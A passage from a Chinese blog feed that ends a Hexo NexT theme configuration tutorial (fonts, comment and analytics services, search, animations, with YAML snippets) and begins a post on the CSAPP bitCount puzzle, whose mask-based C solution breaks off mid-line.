<p><code>highlight_theme</code>：可用值为：<code>normal</code>，<code>night</code>，<code>night eighties</code>，<code>night blue</code>，<code>night bright</code><br>效果示例： <a href="https://github.com/chriskempson/tomorrow-theme" target="_blank" rel="external">https://github.com/chriskempson/tomorrow-theme</a></p>
<hr>
<h2 id="字体设置"><a href="#字体设置" class="headerlink" title="字体设置"></a>字体设置</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="attr">font:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  host:</span></div></pre></td></tr></table></figure>
<p><code>host</code>：外链字体库地址，例如 //fonts.googleapis.com (默认值)</p>
<h3 id="全局字体"><a href="#全局字体" class="headerlink" title="全局字体"></a>全局字体</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="attr">global:</span></div><div class="line"><span class="attr">  external:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  family:</span> <span class="string">Lato</span></div></pre></td></tr></table></figure>
<p>全局字体将应用在body元素上，<code>external</code>表示从<code>host</code>加载字体库，<code>family</code>：选择字体。</p>
<h3 id="标题字体"><a href="#标题字体" class="headerlink" title="标题字体"></a>标题字体</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="attr">headings:</span></div><div class="line"><span class="attr">  external:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  family:</span></div></pre></td></tr></table></figure>
<p>标题字体将应用于h1,h2,h3,h4,h5,h6标题上，<code>external</code>同上，<code>family</code>：选择字体，空白则应用全局字体。</p>
<h3 id="文章字体"><a href="#文章字体" class="headerlink" title="文章字体"></a>文章字体</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="attr">posts:</span></div><div class="line"><span class="attr">  external:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  family:</span></div></pre></td></tr></table></figure>
<p><code>external</code>、<code>family</code>同上。</p>
<h3 id="LOGO-字体"><a href="#LOGO-字体" class="headerlink" title="LOGO 字体"></a>LOGO 字体</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">logo:</span></div><div class="line"><span class="attr">  external:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  family:</span></div><div class="line"><span class="attr">  size:</span></div></pre></td></tr></table></figure>
<p><code>external</code>、<code>family</code>同上。<code>size</code>：字体大小单独设置。</p>
<h3 id="代码块字体"><a href="#代码块字体" class="headerlink" title="代码块字体"></a>代码块字体</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">codes:</span></div><div class="line"><span class="attr">  external:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  family:</span></div><div class="line"><span class="attr">  size:</span></div></pre></td></tr></table></figure>
<p><code>external</code>、<code>family</code>、<code>size</code>同上。</p>
<hr>
<h2 id="第三方服务设置"><a href="#第三方服务设置" class="headerlink" title="第三方服务设置"></a>第三方服务设置</h2><h3 id="MathJax"><a href="#MathJax" class="headerlink" title="MathJax"></a>MathJax</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">mathjax:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  per_page:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  cdn:</span> <span class="string">//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML</span></div></pre></td></tr></table></figure>
<p><code>enable</code>：是否开启 MathJax 来显示数学公式，<code>cdn</code>：用于指定 MathJax 的脚本地址，默认是 MathJax 官方提供的 CDN 地址。</p>
<h3 id="Han"><a href="#Han" class="headerlink" title="Han"></a>Han</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">han:</span> <span class="literal">false</span></div></pre></td></tr></table></figure>
<p>文档：<a href="https://hanzi.pro/" target="_blank" rel="external">https://hanzi.pro/</a></p>
<h3 id="Swiftype-站内搜索"><a href="#Swiftype-站内搜索" class="headerlink" title="Swiftype 站内搜索"></a>Swiftype 站内搜索</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">swiftype_key:</span></div></pre></td></tr></table></figure>
<p>填写Swiftype Search API的值</p>
<h3 id="百度分析"><a href="#百度分析" class="headerlink" title="百度分析"></a>百度分析</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">baidu_analytics:</span></div></pre></td></tr></table></figure>
<p>填写百度分析ID</p>
<h3 id="多说"><a href="#多说" class="headerlink" title="多说"></a>多说</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="attr">duoshuo_shortname:</span></div><div class="line"></div><div class="line"><span class="attr">duoshuo_share:</span> <span class="literal">true</span></div><div class="line"></div><div class="line"><span class="attr">duoshuo_info:</span></div><div class="line"><span class="attr">  ua_enable:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  admin_enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  user_id:</span> <span class="number">0</span></div><div class="line"><span class="attr">  admin_nickname:</span> <span class="string">Author</span></div></pre></td></tr></table></figure>
<p>相关：<a href="http://dev.duoshuo.com" target="_blank" rel="external">http://dev.duoshuo.com</a></p>
<h3 id="Disqus"><a href="#Disqus" class="headerlink" title="Disqus"></a>Disqus</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">disqus:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  shortname:</span></div><div class="line"><span class="attr">  count:</span> <span class="literal">true</span></div></pre></td></tr></table></figure>
<p><code>enable</code>：是否开启 Disqus 评论，<code>count</code>：是否显示评论数</p>
<h3 id="Hypercomments"><a href="#Hypercomments" class="headerlink" title="Hypercomments"></a>Hypercomments</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">hypercomments_id:</span></div></pre></td></tr></table></figure>
<h3 id="畅言"><a href="#畅言" class="headerlink" title="畅言"></a>畅言</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">changyan:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  appid:</span></div><div class="line"><span class="attr">  appkey:</span></div></pre></td></tr></table></figure>
<h3 id="Valine"><a href="#Valine" class="headerlink" title="Valine"></a>Valine</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="attr">valine:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  appid:</span>  <span class="comment"># your leancloud application appid</span></div><div class="line"><span class="attr">  appkey:</span>  <span class="comment"># your leancloud application appkey</span></div><div class="line"><span class="attr">  notify:</span> <span class="literal">false</span> <span class="comment"># mail notifier , https://github.com/xCss/Valine/wiki</span></div><div class="line"><span class="attr">  verify:</span> <span class="literal">false</span> <span class="comment"># Verification code</span></div><div class="line"><span class="attr">  placeholder:</span> <span class="string">Comment</span> <span class="string">input</span> <span class="string">placeholder</span></div></pre></td></tr></table></figure>
<p>相关：<a href="https://leancloud.cn" target="_blank" rel="external">https://leancloud.cn</a></p>
<h3 id="友言"><a href="#友言" class="headerlink" title="友言"></a>友言</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">youyan_uid:</span> <span class="string">your</span> <span class="string">uid</span></div></pre></td></tr></table></figure>
<h3 id="LiveRe"><a href="#LiveRe" class="headerlink" title="LiveRe"></a>LiveRe</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">livere_uid:</span> <span class="string">your</span> <span class="string">uid</span></div></pre></td></tr></table></figure>
<p>相关：<a href="https://livere.com/insight/myCode" target="_blank" rel="external">https://livere.com/insight/myCode</a></p>
<h3 id="百度分享"><a href="#百度分享" class="headerlink" title="百度分享"></a>百度分享</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attr">baidushare:</span></div><div class="line"><span class="attr">  type:</span> <span class="string">button</span></div></pre></td></tr></table></figure>
<p>注意：百度分享不支持https。<code>type</code>可选项：<code>button</code>，<code>slice</code>。</p>
<h3 id="JiaThis"><a href="#JiaThis" class="headerlink" title="JiaThis"></a>JiaThis</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">add_this_id:</span></div></pre></td></tr></table></figure>
<p>相关：<a href="http://www.jiathis.com/" target="_blank" rel="external">http://www.jiathis.com/</a></p>
<h3 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">google_site_verification:</span></div></pre></td></tr></table></figure>
<p>Google 验证码，相关：<a href="https://www.google.com/webmasters/" target="_blank" rel="external">https://www.google.com/webmasters/</a><br><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">google_analytics:</span></div></pre></td></tr></table></figure></p>
<p>Google 分析</p>
<h3 id="Yandex"><a href="#Yandex" class="headerlink" title="Yandex"></a>Yandex</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">yandex_site_verification:</span></div></pre></td></tr></table></figure>
<p>相关：<a href="https://webmaster.yandex.ru/" target="_blank" rel="external">https://webmaster.yandex.ru/</a></p>
<h3 id="CNZZ-统计"><a href="#CNZZ-统计" class="headerlink" title="CNZZ 统计"></a>CNZZ 统计</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">cnzz_siteid:</span></div></pre></td></tr></table></figure>
<h3 id="Application-Insights"><a href="#Application-Insights" class="headerlink" title="Application Insights"></a>Application Insights</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">application_insights:</span></div></pre></td></tr></table></figure>
<p>相关：<a href="https://azure.microsoft.com/en-us/services/application-insights/" target="_blank" rel="external">https://azure.microsoft.com/en-us/services/application-insights/</a></p>
<h3 id="Facebook-SDK"><a href="#Facebook-SDK" class="headerlink" title="Facebook SDK"></a>Facebook SDK</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="attr">facebook_sdk:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  app_id:</span>       <span class="comment">#&lt;app_id&gt;</span></div><div class="line"><span class="attr">  fb_admin:</span>     <span class="comment">#&lt;user_id&gt;</span></div><div class="line"><span class="attr">  like_button:</span>  <span class="comment">#true</span></div><div class="line"><span class="attr">  webmaster:</span>    <span class="comment">#true</span></div></pre></td></tr></table></figure>
<p>相关：<a href="https://github.com/iissnan/hexo-theme-next/pull/410" target="_blank" rel="external">https://github.com/iissnan/hexo-theme-next/pull/410</a></p>
<h3 id="Facebook-评论"><a href="#Facebook-评论" class="headerlink" title="Facebook 评论"></a>Facebook 评论</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="attr">facebook_comments_plugin:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  num_of_posts:</span> <span class="number">10</span>  <span class="comment"># min posts num is 1</span></div><div class="line"><span class="attr">  width:</span> <span class="number">100</span><span class="string">%</span>       <span class="comment"># default width is 550px</span></div><div class="line"><span class="attr">  scheme:</span> <span class="string">light</span>     <span class="comment"># default scheme is light (light or dark)</span></div></pre></td></tr></table></figure>
<h3 id="VKontakte-API"><a href="#VKontakte-API" class="headerlink" title="VKontakte API"></a>VKontakte API</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="attr">vkontakte_api:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  app_id:</span>       <span class="comment">#&lt;app_id&gt;</span></div><div class="line"><span class="attr">  like:</span>         <span class="literal">true</span></div><div class="line"><span class="attr">  comments:</span>     <span class="literal">true</span></div><div class="line"><span class="attr">  num_of_posts:</span> <span class="number">10</span></div></pre></td></tr></table></figure>
<p>相关：<a href="https://vk.com/editapp?act=create" target="_blank" rel="external">https://vk.com/editapp?act=create</a></p>
<h3 id="星星评级"><a href="#星星评级" class="headerlink" title="星星评级"></a>星星评级</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">rating:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  id:</span>     <span class="comment">#&lt;app_id&gt;</span></div><div class="line"><span class="attr">  color:</span>  <span class="string">fc6423</span></div></pre></td></tr></table></figure>
<p>相关：<a href="https://widgetpack.com" target="_blank" rel="external">https://widgetpack.com</a></p>
<h3 id="阅读数统计"><a href="#阅读数统计" class="headerlink" title="阅读数统计"></a>阅读数统计</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">leancloud_visitors:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  app_id:</span> <span class="comment">#&lt;app_id&gt;</span></div><div class="line"><span class="attr">  app_key:</span> <span class="comment">#&lt;app_key&gt;</span></div></pre></td></tr></table></figure>
<p>相关：<a href="https://leancloud.cn" target="_blank" rel="external">https://leancloud.cn</a></p>
<h3 id="不蒜子统计"><a href="#不蒜子统计" class="headerlink" title="不蒜子统计"></a>不蒜子统计</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="attr">busuanzi_count:</span></div><div class="line">  <span class="comment"># count values only if the other configs are false</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line">  <span class="comment"># custom uv span for the whole site</span></div><div class="line"><span class="attr">  site_uv:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  site_uv_header:</span> <span class="string">&lt;i</span> <span class="string">class="fa</span> <span class="string">fa-user"&gt;&lt;/i&gt;</span></div><div class="line"><span class="attr">  site_uv_footer:</span></div><div class="line">  <span class="comment"># custom pv span for the whole site</span></div><div class="line"><span class="attr">  site_pv:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  site_pv_header:</span> <span class="string">&lt;i</span> <span class="string">class="fa</span> <span class="string">fa-eye"&gt;&lt;/i&gt;</span></div><div class="line"><span class="attr">  site_pv_footer:</span></div><div class="line">  <span class="comment"># custom pv span for one page only</span></div><div class="line"><span class="attr">  page_pv:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  page_pv_header:</span> <span class="string">&lt;i</span> <span class="string">class="fa</span> <span class="string">fa-file-o"&gt;&lt;/i&gt;</span></div><div class="line"><span class="attr">  page_pv_footer:</span></div></pre></td></tr></table></figure>
<p>相关：<a href="http://ibruce.info/2015/04/04/busuanzi/" target="_blank" rel="external">http://ibruce.info/2015/04/04/busuanzi/</a><br>例：<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="attr">busuanzi_count:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  site_uv:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  site_uv_header:</span> <span class="string">本站访客数</span></div><div class="line"><span class="attr">  site_uv_footer:</span> <span class="string">人次</span></div><div class="line"><span class="attr">  site_pv:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  site_pv_header:</span> <span class="string">本站总访问量</span></div><div class="line"><span class="attr">  site_pv_footer:</span> <span class="string">次</span></div><div class="line"><span class="attr">  page_pv:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  page_pv_header:</span> <span class="string">本文总阅读量</span></div><div class="line"><span class="attr">  page_pv_footer:</span> <span class="string">次</span></div></pre></td></tr></table></figure></p>
<h3 id="腾讯分析"><a href="#腾讯分析" class="headerlink" title="腾讯分析"></a>腾讯分析</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">tencent_analytics:</span></div></pre></td></tr></table></figure>
<p>移动分析<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">tencent_mta:</span></div></pre></td></tr></table></figure></p>
<h3 id="推送百度"><a href="#推送百度" class="headerlink" title="推送百度"></a>推送百度</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">baidu_push:</span> <span class="literal">true</span></div></pre></td></tr></table></figure>
<p>自动把博客推送到百度上，更容易被搜索。</p>
<h3 id="Google-日历"><a href="#Google-日历" class="headerlink" title="Google 日历"></a>Google 日历</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="attr">calendar:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  calendar_id:</span> <span class="string">&lt;required&gt;</span></div><div class="line"><span class="attr">  api_key:</span> <span class="string">&lt;required&gt;</span></div><div class="line"><span class="attr">  orderBy:</span> <span class="string">startTime</span></div><div class="line"><span class="attr">  offsetMax:</span> <span class="number">24</span></div><div class="line"><span class="attr">  offsetMin:</span> <span class="number">4</span></div><div class="line"><span class="attr">  timeZone:</span></div><div class="line"><span class="attr">  showDeleted:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  singleEvents:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  maxResults:</span> <span class="number">250</span></div></pre></td></tr></table></figure>
<p>相关：<a href="https://developers.google.com/google-apps/calendar/v3/reference/events/list" target="_blank" rel="external">https://developers.google.com/google-apps/calendar/v3/reference/events/list</a></p>
<h3 id="Algolia-搜索"><a href="#Algolia-搜索" class="headerlink" title="Algolia 搜索"></a>Algolia 搜索</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="attr">algolia_search:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  hits:</span></div><div class="line"><span class="attr">    per_page:</span> <span class="number">10</span></div><div class="line"><span class="attr">  labels:</span></div><div class="line"><span class="attr">    input_placeholder:</span> <span class="string">Search</span> <span class="string">for</span> <span class="string">Posts</span></div><div class="line"><span class="attr">    hits_empty:</span> <span class="string">"We didn't find any results for the search: $&#123;query&#125;"</span></div><div class="line"><span class="attr">    hits_stats:</span> <span class="string">"$&#123;hits&#125; results found in $&#123;time&#125; ms"</span></div></pre></td></tr></table></figure>
<h3 id="Local-搜索"><a href="#Local-搜索" class="headerlink" title="Local 搜索"></a>Local 搜索</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">local_search:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  trigger:</span> <span class="string">aut</span></div><div class="line"><span class="attr">  top_n_per_article:</span> <span class="number">1</span></div></pre></td></tr></table></figure>
<p>相关：<a href="https://github.com/flashlab/hexo-generator-search" target="_blank" rel="external">https://github.com/flashlab/hexo-generator-search</a></p>
<hr>
<h2 id="动画设置"><a href="#动画设置" class="headerlink" title="动画设置"></a>动画设置</h2><h3 id="加载动画"><a href="#加载动画" class="headerlink" title="加载动画"></a>加载动画</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">use_motion:</span> <span class="literal">true</span></div></pre></td></tr></table></figure>
<p>加载页面时的动画是否开启。</p>
<h3 id="背景动画"><a href="#背景动画" class="headerlink" title="背景动画"></a>背景动画</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">canvas_nest:</span> <span class="literal">false</span></div><div class="line"><span class="attr">three_waves:</span> <span class="literal">false</span></div><div class="line"><span class="attr">canvas_lines:</span> <span class="literal">false</span></div><div class="line"><span class="attr">canvas_sphere:</span> <span class="literal">false</span></div></pre></td></tr></table></figure>
<p>四种背景动画只能选一种改为true，不过不建议开启，影响注意力。</p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上期链接：&lt;a href=&quot;http://gaufoo.com/2017/08/23/Hexo下的NexT主题配置（上）/&quot;&gt;http://gaufoo.com/2017/08/23/Hexo下的NexT主题配置（上）/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Hexo教程" scheme="http://gaufoo.com/categories/Hexo%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="Hexo" scheme="http://gaufoo.com/tags/Hexo/"/>
    
      <category term="配置" scheme="http://gaufoo.com/tags/%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>C之32位二进制数内1的个数求法</title>
    <link href="http://gaufoo.com/2017/09/05/C%E4%B9%8B32%E4%BD%8D%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E5%86%851%E7%9A%84%E4%B8%AA%E6%95%B0%E6%B1%82%E6%B3%95/"/>
    <id>http://gaufoo.com/2017/09/05/C之32位二进制数内1的个数求法/</id>
    <published>2017-09-05T13:43:00.000Z</published>
    <updated>2017-09-07T09:54:13.757Z</updated>
    
    <content type="html"><![CDATA[<p>《CSAPP》上的题目，略有难度。</p>
<a id="more"></a>
<hr>
<h2 id="问题来源"><a href="#问题来源" class="headerlink" title="问题来源"></a>问题来源</h2><p><img src="/images/606816650151851360.jpg" width="360" alt="图片名称"></p>
<hr>
<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><ol>
<li>编程语言：C</li>
<li>可用操作符：! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</li>
<li>最大操作步数：40</li>
<li>最大操作数：255</li>
</ol>
<hr>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="获取2位二进制数内”1”个数"><a href="#获取2位二进制数内”1”个数" class="headerlink" title="获取2位二进制数内”1”个数"></a>获取2位二进制数内”1”个数</h3><p>设该数为<code>x</code>，则答案易得为<code>(x &amp; 01) + ((x &gt;&gt; 1) &amp; 01)</code></p>
<h3 id="获取4位二进制数内”1”个数"><a href="#获取4位二进制数内”1”个数" class="headerlink" title="获取4位二进制数内”1”个数"></a>获取4位二进制数内”1”个数</h3><p>设该数为<code>x</code><br>可以先把每两位的”1”个数求出，再加起来。</p>
<ol>
<li><code>y = (x &amp; 0101) + ((x &gt;&gt; 1) &amp; 0101)</code></li>
<li><code>count = (y &amp; 0011) + ((y &gt;&gt; 10) &amp; 0011)</code></li>
</ol>
<h3 id="获取8位二进制数内”1”个数"><a href="#获取8位二进制数内”1”个数" class="headerlink" title="获取8位二进制数内”1”个数"></a>获取8位二进制数内”1”个数</h3><p>设该数为<code>x</code><br>把每两位的”1”个数求出，存储在每两位中。再把每四位的”1”个数求出，存储在每四位中。最后加起来。</p>
<ol>
<li><code>y = (x &amp; 01010101) + ((x &gt;&gt; 1) &amp; 01010101)</code></li>
<li><code>z = (y &amp; 00110011) + ((y &gt;&gt; 10) &amp; 00110011)</code></li>
<li><code>count = (z &amp; 00001111) + ((z &gt;&gt; 1000) &amp; 00001111)</code></li>
</ol>
<blockquote>
<p>···<br>···<br>···</p>
</blockquote>
<h3 id="获取32位二进制数内”1”个数"><a href="#获取32位二进制数内”1”个数" class="headerlink" title="获取32位二进制数内”1”个数"></a>获取32位二进制数内”1”个数</h3><ol>
<li>每两位数存”1”的个数：<br><code>storePer2 = (0x???????? &amp; 0x55555555) + ((0x???????? &gt;&gt; 1) &amp; 0x55555555)</code></li>
<li>每四位数存”1”的个数：<br><code>storePer4 = (storePer2 &amp; 0x33333333) + ((storePer2 &gt;&gt; 2) &amp; 0x33333333)</code></li>
<li>每八位数存”1”的个数：<br><code>storePer8 = (storePer4 &amp; 0x0f0f0f0f) + ((storePer4 &gt;&gt; 4) &amp; 0x0f0f0f0f)</code></li>
<li>每十六位数存”1”的个数：<br><code>storePer16 = (storePer8 &amp; 0x00ff00ff) + ((storePer8 &gt;&gt; 8) &amp; 0x00ff00ff)</code></li>
<li>用32位数来存储结果：<br><code>count = (storePer16 &amp; 0x0000ffff) + ((storePer16 &gt;&gt; 16) &amp; 0x0000ffff)</code></li>
</ol>
<hr>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * bitCount - returns count of number of 1's in word</span></div><div class="line"><span class="comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span></div><div class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></div><div class="line"><span class="comment"> *   Max ops: 40</span></div><div class="line"><span class="comment"> *   Rating: 4</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitCount</span><span class="params">(<span class="keyword">int</span> x)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="keyword">int</span> tmpMask1 = (<span class="number">0x55</span>) | (<span class="number">0x55</span> &lt;&lt; <span class="number">8</span>);</div><div class="line">	<span class="keyword">int</span> mask1 = (tmpMask1) | (tmpMask1 &lt;&lt; <span class="number">16</span>);</div><div class="line">	<span class="keyword">int</span> tmpMask2 = (<span class="number">0x33</span>) | (<span class="number">0x33</span> &lt;&lt; <span class="number">8</span>);</div><div class="line">	<span class="keyword">int</span> mask2 = (tmpMask2) | (tmpMask2 &lt;&lt; <span class="number">16</span>);</div><div class="line">	<span class="keyword">int</span> tmpMask3 = (<span class="number">0x0f</span>) | (<span class="number">0x0f</span> &lt;&lt; <span class="number">8</span>);</div><div class="line">	<span class="keyword">int</span> mask3 = (tmpMask3) | (tmpMask3 &lt;&lt; <span class="number">16</span>);</div><div class="line">	<span class="keyword">int</span> mask4 = (<span class="number">0xff</span>) | (<span 